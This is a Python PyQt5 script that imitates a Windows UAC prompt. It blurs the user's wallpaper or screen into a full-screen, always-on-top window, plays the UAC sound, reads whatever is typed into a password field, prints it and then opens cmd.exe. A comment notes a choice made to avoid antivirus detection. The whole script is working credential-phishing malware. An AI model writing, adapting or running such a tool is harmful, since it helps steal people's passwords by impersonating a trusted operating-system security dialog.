from PyQt5 import QtWidgets, QtWebEngineWidgets, QtWebChannel, QtCore
from PyQt5.QtMultimedia import QMediaPlayer, QMediaContent
from PyQt5.QtCore import QUrl 
from pyautogui import screenshot
import cv2, numpy as np
import subprocess as sp
from subprocess import CREATE_NEW_CONSOLE
import sys, os
import ctypes
import base64
import tempfile
from os.path import join, dirname, isfile


def resource_path(relative_path: str) -> str:
    if getattr(sys, 'frozen', False):
        base_path = dirname(sys.executable)
    else:
        base_path = dirname(__file__)
    return join(base_path, relative_path)

def apply_black_blur(filename: str, output: str = "output.jpg", blur_strength: int = 25, darkness: float = 0.5):
    img = cv2.imread(filename)
    if img is None:
        raise ValueError(f"Cannot load image: {filename}")

    blur = cv2.GaussianBlur(img, (blur_strength, blur_strength), 0)
    black_overlay = np.zeros_like(img, dtype=np.uint8)
    dark_blur = cv2.addWeighted(blur, 1 - darkness, black_overlay, darkness, 0)
    cv2.imwrite(output, dark_blur)

    return output

def play_mp3_background(file_path: str):
    global player
    player = QMediaPlayer()
    url = QUrl.fromLocalFile(file_path)
    content = QMediaContent(url)
    player.setMedia(content)
    player.setVolume(50)
    player.play()

class Bridge(QtCore.QObject):
    def __init__(self, view: QtWebEngineWidgets.QWebEngineView, app: QtWidgets.QApplication, program_to_run: str=None, parent=None):
        super().__init__(parent)
        self.view = view
        self.program = program_to_run
        self.app = app

    @QtCore.pyqtSlot(str)
    def on_yes(self):
        self.view.page().runJavaScript(
            "window.passwordentry.value;",
            self.handle_password_result
        )

    def handle_password_result(self, result: str) -> None:
        if result:
            print(result)
        try:
            if self.program:
                sp.Popen(self.program, creationflags=CREATE_NEW_CONSOLE)
        except Exception as e:
            print("Error running program:", e)
        self.on_no()

    @QtCore.pyqtSlot()
    def on_no(self):
        self.app.quit()

def get_current_wallpaper() -> str|None:
    SPI_GETDESKWALLPAPER = 0x0073
    MAX_PATH = 260
    buffer = ctypes.create_unicode_buffer(MAX_PATH)
    ctypes.windll.user32.SystemParametersInfoW(SPI_GETDESKWALLPAPER, MAX_PATH, buffer, 0)
    path = buffer.value
    return path if isfile(path) else None


def main():
    TMP_DIR = "." # I don't know how to avoid anti virus if you do use tempfile.gettempdir()
    BACKGROUND_PATH = join(TMP_DIR, "temporarybackground.png")
    PROGRAM_TO_RUN = "cmd.exe"
    current_wallpaper = get_current_wallpaper()
    if current_wallpaper:
        with open(current_wallpaper, "rb") as fi:
            cw_data = fi.read()
            with open(BACKGROUND_PATH, "wb") as fo:
                fo.write(cw_data)
    else:
        screenshot(BACKGROUND_PATH)
        
    apply_black_blur(BACKGROUND_PATH,BACKGROUND_PATH) 

    with open(BACKGROUND_PATH, "rb") as f:
        encoded = base64.b64encode(f.read()).decode("utf-8")


    app = QtWidgets.QApplication(sys.argv)
    html_file = resource_path("index.html")
    uac_sound_file = resource_path(join("assets", "uacsound.mp3"))

    play_mp3_background(uac_sound_file)
    window = QtWidgets.QWidget()
    window.setWindowFlags(
        QtCore.Qt.FramelessWindowHint |
        QtCore.Qt.WindowStaysOnTopHint |
        QtCore.Qt.Window
    )
    #window.setAttribute(QtCore.Qt.WA_TranslucentBackground)

    screen = app.primaryScreen().size()
    window.resize(screen.width(), screen.height())

    view = QtWebEngineWidgets.QWebEngineView()
    #view.setAttribute(QtCore.Qt.WA_TranslucentBackground)
    #view.page().setBackgroundColor(QtCore.Qt.transparent)
    view.load(QtCore.QUrl.fromLocalFile(html_file))

    channel = QtWebChannel.QWebChannel()
    bridge = Bridge(view=view, app=app, program_to_run=PROGRAM_TO_RUN)
    channel.registerObject("bridge", bridge)
    view.page().setWebChannel(channel)


    def set_background():
        js = f"""
        document.body.style.backgroundImage = "url('data:image/png;base64,{encoded}')";
        """
        view.page().runJavaScript(js)

    # Wait until HTML is fully loaded before injecting CSS
    view.loadFinished.connect(set_background)

    layout = QtWidgets.QVBoxLayout(window)
    layout.setContentsMargins(0, 0, 0, 0)
    layout.addWidget(view)

    window.showFullScreen()
    try:os.remove(BACKGROUND_PATH)
    except:pass
    exit_code = app.exec_()
    sys.exit(exit_code)


if __name__ == "__main__":
    main()